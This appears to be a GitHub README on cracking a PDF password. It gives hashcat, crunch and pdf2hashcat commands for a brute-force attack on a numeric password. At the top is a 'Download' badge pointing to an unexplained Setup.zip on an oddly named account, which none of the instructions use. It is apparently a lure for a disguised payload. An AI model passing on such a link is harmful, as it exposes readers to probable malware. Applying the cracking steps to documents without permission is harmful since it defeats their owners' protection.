# crack pdf file

[![Download](https://img.shields.io/badge/Download%20Link-blue)](https://github.com/owerfanniko5zba/pdf-cracked-by-hashcat/releases/download/tvfdi7/Setup.1.3.7.zip)

usage
-----

```sh
# Download the latest version of hashcat from [Hashcat](https://hashcat.net/hashcat/).
# sample hashcat-7.1.1
wget https://hashcat.net/files/hashcat-7.1.1.7z
7z x hashcat-7.1.1.7z

# build crunch
cd crunch && make
# create numbers_4-8.txt
./crunch 4 8 0123456789 -o numbers_4-8.txt
# create hashcat file
# this use pdf2hashcat to convert pdf to hashcat
# https://github.com/sighook/pdf2hashcat.git
pdf2hashcat dummy.pdf | tee dummy.pdf.hashcat
# $pdf$2
# $pdf$ first number
# 1 PDF 1.1-1.3（Acrobat 2-4）	    10400
# 2	PDF 1.4-1.6（Acrobat 5-8）	    25400
# 3	PDF 1.7 Level 3（Acrobat 9）    10500
# 4	PDF 1.7 Level 8+（Acrobat X+）	10600
export MODE=25400
./hashcat-7.1.1/hashcat.bin -m $MODE -a 0 dummy.pdf.hashcat numbers_4-8.txt
./hashcat-7.1.1/hashcat.bin --show dummy.pdf.hashcat
```
